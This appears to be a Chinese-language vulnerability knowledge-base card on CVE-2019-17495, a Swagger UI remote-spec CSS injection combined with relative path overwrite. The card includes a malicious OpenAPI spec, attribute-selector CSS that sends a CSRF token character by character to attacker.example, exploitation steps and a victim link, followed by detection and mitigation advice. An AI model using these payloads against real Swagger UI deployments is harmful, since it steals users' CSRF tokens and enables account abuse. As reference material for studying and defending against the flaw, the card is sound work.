---
id: web-generic-xs-leaks-swagger-ui-rpo-css-injection-csrf-token
title: Swagger UI 远程 spec + RPO CSS 注入：属性选择器逐字符窃取 CSRF Token（CVE-2019-17495）
type: scenario
domain: web
path: web/generic/xs-leaks
technique: swagger-ui-rpo-css-injection-token-exfil
aliases:
- CVE-2019-17495
- Swagger UI RPO
- Swagger UI CSS 注入
- Swagger CSRF Token 窃取
- swagger url 参数 CSS 注入
tags:
- web
- css-injection
- rpo
- relative-path-overwrite
- xs-leaks
- swagger
- openapi
- csrf-token
- attribute-selector
cve:
- CVE-2019-17495
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V302
  verified_at: '2026-11-08T12:14:32+08:00'
  notes: 已对照原文 content.md 与 7 张图片核对：img07 为 petstore.swagger.io/?url=https://localhost/json，DOM 中 info.description 注入 <style>@import url(//localhost/staging?len=32);</style>；原文确认 Swagger 支持远程 spec、相对 CSS 与 CVE-2019-17495，属性选择器 input[name=csrf][value^=aa] 的 CSS 外带思路与原文一致。该卡为 CVE 特定完整链（远程 spec→Markdown style→RPO CSS→属性选择器逐字符外带），与通用 CSS 外带原语、Swagger configUrl DOM XSS、CSRF 写 profile CSS 的 RPO 链触发不同，放 xs-leaks 合理；粒度合格。cve 已含 CVE-2019-17495；原文未给版本区间故 affected_versions 留空（正文只在防御处提及公告修复版本 3.23.11）。未验证点：未实际搭建 Swagger UI/未跑逐位爆破，confidence medium 合理。
---

## 一句话结论

Swagger UI 允许用 `?url=` 加载攻击者托管的远程 OpenAPI spec，spec 的 `description` 会被当 HTML/Markdown 渲染，可插入 `<style>@import`；在 Swagger UI 相对 CSS 加载造成的 RPO 条件下，攻击者样式在文档页面源内生效，再用属性选择器把 `input[name=csrf]` 的 value 逐字符通过 `background-image` 请求外带，即可还原 CSRF Token 并进一步越权。

## 原理

- **远程 spec 可控**：Swagger UI 从查询串取 `url` 参数并交给 `SwaggerUIBundle` 加载：
  ```js
  var url = window.location.search.match(/url=([^&]+)/);
  url = options.swaggerUrl || url;
  var swaggerOptions = { spec: spec1, url: url };
  var ui = SwaggerUIBundle(swaggerOptions);
  ```
  代码没有把 `url` 限制为同源/白名单，浏览器会去请求攻击者指定的 JSON，攻击者因此完全控制 spec 内容。
- **Markdown/HTML 注入**：spec 的 `info.description` 等字段被 Swagger UI 以 Markdown/HTML 形式插入 DOM；攻击者在 description 里放 `<style>@import url(//attacker.example/staging?len=32);</style>`，样式元素进入文档，`@import` 再从攻击者服务器拉取完整 CSS（截图中的 `len=32` 是分片/长度控制参数）。
- **RPO 放大**：Swagger UI 页面用相对路径加载自身静态资源；当文档 URL 带额外路径段（`/入口/额外路径`）时，浏览器按“当前目录”解析相对资源，请求落到 `/入口/额外路径/<资源名>`，服务端经重写仍返回文档页面；缺少 `X-Content-Type-Options: nosniff` 时浏览器按样式表解析这段响应，攻击者注入的 CSS 因此在目标源内被当作样式执行，而不是被当作普通文本。
- **CSS 外带 oracle**：CSS 不能读取 DOM 值，但属性选择器可以按前缀条件命中：`input[name=csrf][value^="aa"]{background-image:url(https://attacker.example/exfil/ca)}`。只有命中候选前缀时浏览器才请求对应图片，攻击者服务器收到哪个 URL 就说明哪个字符正确；逐位推进即可还原完整 Token。
- 与普通 XSS 相比，这条链不需要执行 JavaScript：注入的是样式，泄露靠资源请求，因此对 CSP `script-src` 类限制不敏感，但依赖 `style-src`/`img-src` 允许注入样式与外链图片。

## 触发条件

- 目标部署了存在 RPO + CSS 注入问题的 Swagger UI 版本（CVE-2019-17495；文章未标注具体版本区间）。
- Swagger UI 允许通过 `url` 参数加载外部来源的 spec，且未限制 `style-src`/`img-src`。
- spec 的 `description` 等 Markdown 字段被当 HTML 渲染，可注入 `<style>` 或 `<link rel=stylesheet>`。
- 页面静态资源使用相对路径引用，且响应缺少 `nosniff`，RPO 条件成立。
- 敏感值（CSRF Token）位于可被属性选择器匹配的 DOM 属性中，例如 `input[name=csrf]` 的 `value`。
- 受害者需访问构造好的 Swagger UI 链接；Token 需在页面加载期间保持稳定以便多轮枚举。

## 利用步骤

1. 确认目标 Swagger UI 可通过 `?url=` 加载外部 spec，以及页面是否存在可用于 RPO 的路径后缀行为。
2. 在攻击者服务器托管恶意 OpenAPI JSON，在 `info.description` 中写入 `<style>@import url(//attacker.example/staging?len=32);</style>`。
3. 在攻击者服务器按轮生成 CSS：为当前已知前缀的每个候选字符生成一条 `input[name=csrf][value^="<prefix><candidate>"]{background-image:url(...)}` 规则，命中 URL 携带候选字符。
4. 诱导受害者打开 `https://target/?url=https://attacker.example/spec.json`（必要时带 RPO 路径后缀，让相对 CSS 解析到可控响应）。
5. 收集 `background-image` 回连，命中的候选即下一位字符；更新前缀后重复，直到 Token 完整。
6. 用还原出的 CSRF Token 构造越权请求（如修改资料、发起敏感操作），或其他依赖该 Token 的二次利用。

## PoC

恶意 spec（关键字段）：

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "XSS",
    "version": "1.0.1",
    "description": "<style>@import url(//attacker.example/staging?len=32);</style>"
  },
  "paths": {}
}
```

攻击者 CSS（`staging` 端点返回，按轮替换）：

```css
input[name=csrf][value^=aa]{ background-image: url(https://attacker.example/exfil/ca); }
input[name=csrf][value^=ab]{ background-image: url(https://attacker.example/exfil/cb); }
/* ... 覆盖当前前缀下的所有候选 ... */
input[name=csrf][value^=a9]{ background-image: url(https://attacker.example/exfil/c9); }
```

```text
受害者链接：
https://target.example/swagger-ui/?url=https://attacker.example/spec.json

命中判定：attacker.example 收到 /exfil/<某候选>，说明 input value 以该前缀开头；
追加该字符作为新前缀继续生成规则，直到读全 CSRF Token。
```

## 变体与关联

- 变体：`@import` 被过滤时改用 `<link rel="stylesheet" href="...">` 或直接内联多条属性选择器规则。
- 变体：目标系统把 Token 放在 `href`、`data-*` 或隐藏 input 时，改用 `[href^=]`、`:has()`、`:valid`/`pattern` 等选择器；隐藏 input 可能不渲染背景，需要换 oracle。
- 关联：`[[web-generic-xs-leaks-css-attribute-selector-exfil]]` 是本卡外带原语的一般化卡片。
- 关联：`[[web-generic-csrf-rpo-css-selector-side-channel]]` 是另一条 RPO + CSS 选择器链，但入口是 CSRF 写入用户 profile CSS，与本卡“远程 spec + Markdown 样式注入”的触发条件和环境不同。
- 关联：`[[web-generic-xss-swagger-ui-configurl-dom-xss]]` 同样滥用 Swagger UI 的 `url`/`configUrl` 加载外部配置，但落点是脚本执行；本卡落点是 CSS 注入与 Token 外带。
- 边界：新版 Swagger UI 修复该问题、CSP 禁止外链样式/图片、无法注入 `<style>`、Token 不在可匹配属性或被放入隐藏元素且无替代 oracle 时，该链不成立；文章未给出完整逐位爆破脚本与版本区间，本卡 confidence 记为 medium。

## 检测与防御

- 检测：Swagger UI 访问日志出现 `url=` 指向外部域名；页面出现含 `@import`、`background-image:url(`、属性选择器（`[value^=]`、`[href^=]`）的内联样式；同源页面短时间大量对外图片请求。
- 修复：升级 Swagger UI 到官方修复版本（CVE-2019-17495 公开公告给出的修复版本为 3.23.11）；生产环境关闭或鉴权保护 Swagger UI。
- 修复（RPO）：静态资源改用绝对路径或设置 `<base>`；对 HTML 响应设置正确 `Content-Type` 与 `X-Content-Type-Options: nosniff`，禁止 HTML 被当 CSS 解析。
- 加固：限制 `url`/`configUrl` 只加载同源或白名单配置；对 Markdown 渲染结果做 HTML 清洗，禁止 `<style>`/`<link>`；CSP 限制 `style-src` 与 `img-src`，并避免把 CSRF Token 放在可被选择器匹配的 DOM 属性中。
